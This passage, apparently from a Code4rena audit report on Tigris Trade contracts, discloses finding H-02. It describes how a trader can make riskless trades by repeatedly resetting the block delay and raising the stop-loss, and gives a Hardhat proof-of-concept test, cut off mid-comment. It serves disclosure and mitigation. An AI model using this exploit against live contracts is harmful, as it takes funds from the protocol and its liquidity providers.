9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/67\">[H-02] Riskless trades due to delay check</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/67\">Bobface</a></em></p>\n<p><code>Trading.limitClose()</code> uses <code>_checkDelay()</code>. This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.</p>\n<h3 id=\"detailed-description\" style=\"position:relative;\"><a href=\"#detailed-description\" aria-label=\"detailed description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Detailed description</h3>\n<p>A malicious trader can exploit the <code>Trading</code> contract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.</p>\n<p>The exploit is based on three principles:</p>\n<ol>\n<li>The stop-loss of a position can be updated without any delay checks, due to <code>_checkDelay()</code> not being called in <code>updateTpSl()</code></li>\n<li>Positions can only be closed by MEV bots or other third parties after the block delay has been passed due to <code>limitClose</code> calling <code>_checkDelay()</code></li>\n<li>The block delay can be continuously renewed for a negligible cost</li>\n</ol>\n<p><strong>Based on these three principles, the following method can be used to perform riskless trades:</strong>\nAssuming a current market price of 1,000 DAI, begin by opening a long limit order through <code>initiateLimitOrder()</code> at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order through <code>executeLimitOrder</code>.</p>\n<p>After the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would call <code>limitClose</code>. However, we can prevent them from doing so by continuously calling <code>addToPosition</code> with 1 wei when the block delay comes close to running out <em>[1]</em>, which will renew the delay and thus stops <code>limitClose</code> from being called.</p>\n<p>While the trader keeps renewing the delay to stop his position from being closed, he watches the price development:</p>\n<ul>\n<li>If the price goes <strong>down</strong>, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated through <code>liquidatePosition()</code>. If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again.</li>\n<li>If the price goes <strong>up</strong>, the trader calls <code>updateTpSl()</code> to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he calls <code>updateTpSl()</code> with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to <code>_checkDelay()</code>.</li>\n</ul>\n<p>The trader keeps calling <code>updateTpSl()</code> when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and calls <code>limitClose()</code> to close the order at the peak stop-loss.</p>\n<p><em>Notes</em>\n<em>[1]</em>: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls to <code>addToPosition</code> after every few transactions on the chain. However, <code>block.number</code>, which is used by the contract, actually returns the L1 block number and not the L2 block number.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking in <code>limitClose()</code> should be modified to also consider whether the position is below the stop-loss.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Insert the following code as test into <code>test/07.Trading.js</code> and run it with <code>npx hardhat test test/07.Trading.js</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;PoC&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;PoC&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Setup token balances and approvals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mockDAI</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MockERC20&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10000&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stablevault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;100000&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10000&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">daiAtBeginning</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">permitData</span><span class=\"mtk1\"> = [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Setup block delay to 5 blocks</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blockDelay</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setBlockDelay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blockDelay</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// =================== Create the limit order =================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tradeInfo</span><span class=\"mtk1\"> = [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;9000&quot;</span><span class=\"mtk1\">),       </span><span class=\"mtk3\">// margin amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,          </span><span class=\"mtk3\">// margin asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,      </span><span class=\"mtk3\">// stable vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;2&quot;</span><span class=\"mtk1\">),          </span><span class=\"mtk3\">// leverage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,                        </span><span class=\"mtk3\">// asset id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,                     </span><span class=\"mtk3\">// direction (long)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">),          </span><span class=\"mtk3\">// take profit price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">),       </span><span class=\"mtk3\">// stop loss price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">HashZero</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// referral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Create the order</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">initiateLimitOrder</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tradeInfo</span><span class=\"mtk1\">,            </span><span class=\"mtk3\">// trade info</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,                    </span><span class=\"mtk3\">// order type (limit)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">),   </span><span class=\"mtk3\">// price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">permitData</span><span class=\"mtk1\">,           </span><span class=\"mtk3\">// permit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">          </span><span class=\"mtk3\">// trader</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// =================== Execute the limit order ================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Wait for some blocks to pass the delay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk7\">10</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">n</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">n</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">blockDelay</span><span class=\"mtk1\">; </span><span class=\"mtk12\">n</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Create the price data (the price hasn&#39;t changed)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\"> = [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,                                   </span><span class=\"mtk3\">// provider</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,                                              </span><span class=\"mtk3\">// asset id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">),                             </span><span class=\"mtk3\">// price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">10000000</span><span class=\"mtk1\">,                                       </span><span class=\"mtk3\">// spread (0.1%)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBlock</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">,   </span><span class=\"mtk3\">// timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span><span class=\"mtk1\">                                           </span><span class=\"mtk3\">// is closed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Sign the price data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk12\">defaultAbiCoder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          [</span><span class=\"mtk8\">&#39;address&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bool&#39;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          [</span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">4</span><span class=\"mtk1\">], </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">[</span><span class=\"mtk7\">5</span><span class=\"mtk1\">]]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sig</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk11\">signMessage</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">Buffer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk12\">message</span><span class=\"mtk1\">.</span><span class=\"mtk11\">substring</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;hex&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Execute the limit order</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">executeLimitOrder</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">priceData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sig</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ================== Block bots from closing =================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// ============================================================== //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">5</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/*</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">          This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">          We constantly add 1 wei to the position when the delay is close to running out.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">          This won&#39;t change anything about our position, but it will reset the delay timer,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">          stopping bots from calling `limitClose()`. </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">          This means that if the price drops, 